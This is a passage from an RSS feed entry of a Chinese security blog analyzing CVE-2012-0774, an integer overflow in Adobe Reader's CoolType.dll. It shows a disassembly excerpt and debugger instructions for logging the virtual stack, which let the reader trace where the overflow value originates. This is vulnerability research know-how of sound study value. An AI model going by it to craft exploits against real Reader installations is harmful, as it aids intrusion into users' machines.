    69368B19   77 18            JA SHORT CoolType.69368B33
    69368B1B   3B0A             CMP ECX,DWORD PTR DS:[EDX]
    69368B1D   76 14            JBE SHORT CoolType.69368B33
    69368B1F   8B4C24 04        MOV ECX,DWORD PTR SS:[ESP+4]
    69368B23   0FB611           MOVZX EDX,BYTE PTR DS:[ECX]
    69368B26   8910             MOV DWORD PTR DS:[EAX],EDX
    69368B28   8305 E0235969 04 ADD DWORD PTR DS:[695923E0],4
    69368B2F   8D41 01          LEA EAX,DWORD PTR DS:[ECX+1]
    69368B32   C3               RETN
    由于B0 01虚拟指令对应的虚拟动作是将1压栈,现在要找到1所在的真实内存位置,f8单步

f8
...
...
f8
eip=69368b26时,edx=1,[eax]=1,对应&quot;虚拟栈顶&quot;vm_esp中的数据
f8
eip=69368b28时,此时已经将1赋值给[eax],此时可以看到[695923e0]=69596240=eax
f8
    eip=69368b2f,此时已经执行完ADD DWORD PTR DS:[695923E0],4,后面再f8再次就执行完call了,执行完call之后要想得到
    &quot;虚拟栈顶&quot;vm_esp中的数据的方法为:查看真实内存中的值[[695923e0]-4],所以要想得到溢出前每个索引对应的call在
    call执行前与call执行后虚拟栈顶的值及虚拟指令,则需要设置条件记录断点,并设置expression为:&quot;[[695923e0]-4]&quot;,为
    了观察更多,也记录vm_esp-4中的数据,并在call调用前和调用后分别记录,也即最后这样设置:
    在call的上一句指令处设置条件记录断点,并设置explanation为:&quot;执行前[vm_esp]&quot;,设置expression为:&quot;[[695923e0]-4]&quot;
    在call的上一句指令处设置条件记录断点,并设置explanation为:&quot;执行前[vm_esp-4],设置expression为&quot;[[695923e0]-8]&quot;
    在call指令处设置条件记录断点,并设置explanation为:&quot;虚拟指令索引号&quot;,设置expression为&quot;ecx&quot;
    在call的下一句指令处设置条件记录断点,并设置explanation为:&quot;执行后[vm_esp]&quot;,设置expression为:&quot;[[695923e0]-4]&quot;
    在call的下一句指令处设置条件记录断点,并设置explanation为:&quot;执行后[vm_esp-4],设置expression为&quot;[[695923e0]-8]&quot;
    上面5个设置中都设置不中断且记录expression的值

重新打开read并用immu附加,此时cooltype.dll基址为6dd90000,关键call调用的地址为6dd96957   
ctrl+g:6dd96957,按照上面的5个设置条件记录断点之后便可得到书中对应log记录,再通过分析log得到0x40000001的来源过程.
需注意要在32位系统上调试,如果在64位系统上调试应该设置explanation为vm_esp和vm_esp-8,expression对应为
[[695923e0]-4]和[[695923e0]-0xc].

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 25 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/25/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0774/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/25/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0774/</guid>
        
        <category>漏洞分析</category>
        
        <category>整数溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
  </channel>
</rss>
